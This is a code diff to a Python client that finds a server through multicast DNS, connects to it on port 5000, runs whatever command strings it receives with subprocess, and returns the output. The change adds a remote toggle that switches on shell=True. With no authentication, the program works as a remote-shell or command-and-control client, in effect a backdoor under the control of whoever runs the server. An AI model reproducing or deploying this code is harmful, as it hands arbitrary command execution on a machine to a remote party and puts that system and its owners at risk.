@@ -3,10 +3,14 @@ from multicast_dns import *
 import time
 import subprocess
 
+shell = False
+
 def cmd(c):
-    return subprocess.Popen(c.split(" "), stdout=subprocess.PIPE).communicate(timeout=10)
+    global shell
+    return subprocess.Popen(c.split(" "), stdout=subprocess.PIPE, shell=shell).communicate(timeout=10)
 
 def client_program():
+    global shell
     ip = listen_dns()
 
     port = 5000  # socket server port number
@@ -21,11 +25,22 @@ def client_program():
                 data = client_socket.recv(1024).decode()
                 if data == "stop" or data == "":
                     break
-                try:
-                    ret = cmd(data)[0]
-                except Exception as e:
-                    ret = bytes(str(e), "utf-8")
-                client_socket.send(ret)
+                if data.startswith("shell"):
+                    a = data.split(" ")
+                    if len(a) != 2:
+                        client_socket.send(bytes("Error " + data, "utf-8"))
+                    else:
+                        if a[1] == "true":
+                            shell = True
+                        else:
+                            shell = False
+                        client_socket.send(bytes("OK", "utf-8"))
+                else:
+                    try:
+                        ret = cmd(data)[0]
+                    except Exception as e:
+                        ret = bytes(str(e), "utf-8")
+                    client_socket.send(ret)
 
             client_socket.close()  # close the connection
         except:
